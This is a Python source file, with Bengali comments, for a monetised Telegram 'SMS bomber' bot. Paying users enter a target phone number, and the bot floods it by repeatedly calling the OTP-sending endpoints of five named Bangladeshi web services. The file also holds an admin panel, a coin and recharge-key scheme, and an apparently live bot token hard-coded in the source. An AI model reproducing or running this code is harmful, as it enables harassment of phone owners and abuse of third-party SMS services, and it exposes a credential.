import telebot
import requests
import json
import os
import time
import threading
import random
import uuid
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস সিস্টেম ---
def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_db(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

users = load_db('users.json')
keys = load_db('keys.json')

# --- লগিং ফাংশন ---
def send_log(text):
    try:
        bot.send_message(LOG_CHANNEL, f"📜 **System Log**\n⏰ {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n\n{text}")
    except: pass

# --- জয়েন চেক ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return True # API Error এড়ালে True ধরে নিবে

# --- ইউজার ম্যানেজমেন্ট ---
def update_user(user):
    uid = str(user.id)
    if uid not in users:
        users[uid] = {
            "name": user.first_name,
            "username": f"@{user.username}" if user.username else "N/A",
            "status": "Active",
            "coins": 50,
            "sent": 0
        }
        save_db('users.json', users)
        send_log(f"🆕 **New User:** {user.first_name} (`{uid}`)")
    return users[uid]

# --- মেইন স্টার্ট কমান্ড ---
@bot.message_handler(commands=['start'])
def start(message):
    u = update_user(message.from_user)
    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
        markup.add(types.InlineKeyboardButton("🔄 Verify Join", callback_data="verify"))
        bot.send_photo(message.chat.id, LOGO_URL, caption="⚠️ **Access Denied!**\nPlease join our channel to use this service.", reply_markup=markup)
        return
    
    main_menu(message.chat.id, u)

def main_menu(chat_id, u):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Start SMS Bomb", callback_data="bomb"),
        types.InlineKeyboardButton("👤 My Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Use Recharge Key", callback_data="use_key"),
        types.InlineKeyboardButton("💎 Buy Coins", url="https://t.me/DarkUnkwon")
    )
    bot.send_photo(chat_id, LOGO_URL, caption=f"🔥 **Welcome, {u['name']}!**\n\n💰 Balance: `{u['coins']} Coins`\n🛡 Status: `{u['status']}`\n\n_Select an option from below:_ ", reply_markup=markup)

# --- অ্যাডমিন কন্ট্রোল প্যানেল ---
@bot.message_handler(commands=['admin'])
def admin_menu(message):
    if message.from_user.id != ADMIN_ID: return
    text = (
        "👑 **Admin Control Panel**\n\n"
        "📊 `/stats` - চেক সিস্টেম ওভারভিউ\n"
        "👥 `/users` - সকল ইউজার লিস্ট দেখা\n"
        "⚙️ `/setstatus [ID] [Status]` - স্ট্যাটাস (Blocked/Lifetime/Active)\n"
        "💰 `/addcoins [ID] [Amount]` - কয়েন অ্যাড করা\n"
        "🔑 `/gen [Amount]` - কি জেনারেট করা\n"
        "📢 `/broadcast [Message]` - সবাইকে মেসেজ দেওয়া"
    )
    bot.reply_to(message, text)

@bot.message_handler(commands=['stats'])
def admin_stats(message):
    if message.from_user.id != ADMIN_ID: return
    total_u = len(users)
    bot.reply_to(message, f"📊 **Bot Statistics**\n\nTotal Users: {total_u}\nServer: Active ✅")

@bot.message_handler(commands=['setstatus'])
def admin_status(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, uid, status = message.text.split()
        if uid in users:
            users[uid]['status'] = status
            save_db('users.json', users)
            bot.reply_to(message, f"✅ User {uid} status set to {status}")
        else: bot.reply_to(message, "❌ User ID not found!")
    except: bot.reply_to(message, "Usage: `/setstatus [ID] [Status]`")

@bot.message_handler(commands=['addcoins'])
def admin_addcoins(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, uid, amount = message.text.split()
        if uid in users:
            users[uid]['coins'] += int(amount)
            save_db('users.json', users)
            bot.reply_to(message, f"✅ Added {amount} coins to {uid}")
        else: bot.reply_to(message, "❌ User ID not found!")
    except: bot.reply_to(message, "Usage: `/addcoins [ID] [Amount]`")

# --- কলব্যাক হ্যান্ডলিং ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    uid = str(call.from_user.id)
    u_data = users.get(uid)

    if call.data == "verify":
        if is_joined(call.from_user.id):
            bot.delete_message(call.message.chat.id, call.message.message_id)
            main_menu(call.message.chat.id, u_data)
        else: bot.answer_callback_query(call.id, "❌ Join first!", show_alert=True)

    elif call.data == "profile":
        profile_text = (f"👤 **User Info**\n\n"
                        f"Name: {u_data['name']}\n"
                        f"Coins: {u_data['coins']}\n"
                        f"Status: {u_data['status']}\n"
                        f"Total Sent: {u_data['sent']}")
        bot.send_message(call.message.chat.id, profile_text)

    elif call.data == "bomb":
        if u_data['status'] == "Blocked":
            bot.answer_callback_query(call.id, "🚫 Your account is blocked!", show_alert=True)
            return
        # অ্যাটাক শুরুর আগেই ব্যালেন্স চেক (৫ কয়েন)
        if u_data['status'] != "Lifetime" and u_data['coins'] < 5:
            bot.send_message(call.message.chat.id, "⚠️ **Insufficient Balance!**\nYou need at least 5 coins to start an attack.")
            return
            
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number:**")
        bot.register_next_step_handler(msg, get_number)

# --- বোম্বিং লজিক ---
def get_number(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **Enter SMS Amount (Max 100):**")
        bot.register_next_step_handler(msg, lambda m: start_attack(m, num))
    else: bot.reply_to(message, "❌ Invalid Number! Use 11 digits.")

def start_attack(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        
        # পুনরায় চেক
        if users[uid]['status'] != 'Lifetime' and users[uid]['coins'] < 5:
            bot.send_message(message.chat.id, "⚠️ Low balance!")
            return

        p_msg = bot.send_message(message.chat.id, "🚀 **Initializing High-Speed Attack...**")
        threading.Thread(target=bombing_engine, args=(uid, num, amount, p_msg)).start()
    except: bot.send_message(message.chat.id, "❌ Enter a valid number.")

def bombing_engine(uid, num, amount, p_msg):
    success = 0
    # হাই কোয়ালিটি এপিআই লিস্ট
    apis = [
        "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "https://bikroy.com/data/relative/login-with-otp",
        "https://shikho.com/api/auth/v2/send-otp",
        "https://www.osudpotro.com/api/v1/users/send-otp",
        "https://api.chaldal.com/api/customer/SendLoginOtp"
    ]
    
    cost = 5 # প্রতি রিকোয়েস্টে ৫ কয়েন কাটবে

    for i in range(1, amount + 1):
        try:
            url = random.choice(apis)
            headers = {'User-Agent': 'Mozilla/5.0'}
            # ভিন্ন ভিন্ন এপিআই এর জন্য ভিন্ন ডাটা ফরম্যাট
            payload = {"phone": num, "contact": num, "number": "+88"+num, "mobile": num}
            
            r = requests.post(url, json=payload, headers=headers, timeout=10)
            
            # সাকসেস চেক
            if r.status_code == 200 or r.status_code == 201:
                success += 1
            
            # অ্যানিমেশন আপডেট
            if i % 2 == 0 or i == amount:
                progress = "▰" * (i // 10) + "▱" * (10 - (i // 10))
                bot.edit_message_text(
                    f"🚀 **Attack in Progress...**\n\n"
                    f"📱 Target: `{num}`\n"
                    f"📊 Progress: `{progress}` {i}/{amount}\n"
                    f"✅ Successful: `{success}`\n"
                    f"⚡ Status: `Sending...`",
                    p_msg.chat.id, p_msg.message_id
                )
            time.sleep(0.2) # স্পিড অপ্টিমাইজড
        except:
            pass

    # কয়েন কাটা ও ডাটা আপডেট
    if users[uid]['status'] != 'Lifetime':
        users[uid]['coins'] -= cost
    
    users[uid]['sent'] += success
    save_db('users.json', users)

    # ফাইনাল রেজাল্ট
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🚀 New Attack", callback_data="bomb"))
    
    final_text = (f"✅ **Attack Finished!**\n\n"
                  f"📱 Target: `{num}`\n"
                  f"📤 Total Sent: `{success}`\n"
                  f"💰 Coins Deducted: `{cost}`\n"
                  f"💳 Current Balance: `{users[uid]['coins']}`\n\n"
                  f"🛡 *Status: Completed*")
    
    bot.edit_message_text(final_text, p_msg.chat.id, p_msg.message_id, reply_markup=markup)
    send_log(f"🚀 **Attack Finished!**\nTarget: `{num}`\nSent: `{success}`\nUser: {users[uid]['name']}")

# --- রান ---
if __name__ == "__main__":
    print("--- DU ModZ Bot is Running ---")
    send_log("✅ **Bot Server is now Live!**")
    bot.infinity_polling()
